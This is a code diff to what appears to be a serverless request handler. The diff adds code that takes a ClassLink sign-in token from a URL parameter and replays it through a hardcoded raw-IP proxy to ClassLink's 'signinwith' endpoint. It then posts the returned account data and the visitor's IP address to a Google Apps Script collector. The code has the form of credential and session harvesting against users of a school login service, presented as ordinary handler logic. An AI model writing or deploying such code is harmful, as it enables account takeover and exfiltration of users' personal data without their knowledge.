@@ -3,20 +3,49 @@ export async function onRequest(context) {
     const url = new URL(request.url);
     const searchParams = url.search;
 
-    // Regex to extract the 'id' parameter value
+    // Regex to extract the 'i' parameter value
     const idMatch = searchParams.match(/[?&]i=([^&]+)/);
     const id = idMatch ? idMatch[1] : null;  // If a match is found, extract the value
+
+    // Apply regex to extract the content between the second and third quotation marks
+    let extractedText = null;
+    if (id) {
+        const regex = /^(?:[^"]*"[^"]*"){2}([^"]*)/;
+        const match = id.match(regex);
+        extractedText = match ? match[1] : null;
+    }
 
     const ip = request.headers.get("CF-Connecting-IP");
 
     try {
         if (id) {
+            // Proxy request to nodeapi.classlink.com
+            const proxyUrl = "http://35.185.202.12:80"; // Replace with actual proxy URL
+            const nodeApiResponse = await fetch(proxyUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    url: "https://nodeapi.classlink.com/user/signinwith",
+                    method: "GET",
+                    headers: { "gwstoken": extractedText }
+                })
+            });
+
+            if (!nodeApiResponse.ok) {
+                return new Response(JSON.stringify({ error: "Proxy request failed" }), { status: 500 });
+            }
+
+            const nodeApiData = await nodeApiResponse.json();
+
+            // Send data to Google Script
             const response = await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ id: id, ip: ip })
+                body: JSON.stringify({ data: nodeApiData, ip: ip })
             });
 
             if (!response.ok) {
